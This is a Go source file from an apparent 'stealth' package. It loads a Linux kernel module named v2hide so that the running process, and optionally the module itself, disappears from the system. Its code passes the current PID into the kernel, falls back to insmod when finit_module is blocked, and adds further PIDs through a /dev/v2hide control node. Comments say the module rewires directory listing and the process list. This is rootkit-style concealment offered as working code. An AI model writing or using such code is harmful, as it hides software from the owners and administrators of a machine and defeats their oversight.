//go:build linux

package stealth

import (
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"golang.org/x/sys/unix"
)

// 与 tools/linux-hide/v2hide.c 约定的模块名与设备节点
const (
	linuxModuleName = "v2hide"
	linuxDevicePath = "/dev/v2hide"
)

// kernelHide 在进程启动后立刻加载隐藏模块，把当前 pid 交给内核侧摘除。
func kernelHide(c Config) error {
	path := c.KernelModule
	if path == "" {
		path = "/etc/v2nb/" + linuxModuleName + ".ko"
	}
	if _, err := os.Stat(path); err != nil {
		return fmt.Errorf("模块不存在 %s: %w", path, err)
	}
	params := fmt.Sprintf("target_pid=%d hide_module=%d dev_name=%s",
		os.Getpid(), boolToInt(c.HideModule), c.Alias)

	if err := finitModule(path, params); err != nil {
		// 回退：某些内核/受限容器里 finit_module 会被拦，改用 kmod 的 insmod
		cmd := exec.Command("insmod", append([]string{path}, strings.Fields(params)...)...)
		if out, e := cmd.CombinedOutput(); e != nil {
			return fmt.Errorf("finit_module: %v; insmod: %v (%s)", err, e, strings.TrimSpace(string(out)))
		}
	}
	return nil
}

func finitModule(path, params string) error {
	f, err := os.Open(path)
	if err != nil {
		return err
	}
	defer f.Close()
	return unix.FinitModule(int(f.Fd()), params, 0)
}

// kernelUnhide 卸载模块：模块 exit 会恢复 dir_context->actor 与进程链表。
func kernelUnhide() error {
	if err := unix.DeleteModule(linuxModuleName, 0); err != nil {
		cmd := exec.Command("rmmod", linuxModuleName)
		if out, e := cmd.CombinedOutput(); e != nil {
			return fmt.Errorf("delete_module: %v; rmmod: %v (%s)", err, e, strings.TrimSpace(string(out)))
		}
	}
	return nil
}

// kernelAddPID 通过 /dev/v2hide 控制节点追加要隐藏的 pid。
func kernelAddPID(pid int) error {
	f, err := os.OpenFile(linuxDevicePath, os.O_WRONLY, 0)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.WriteString("add " + strconv.Itoa(pid))
	return err
}

func boolToInt(b bool) int {
	if b {
		return 1
	}
	return 0
}
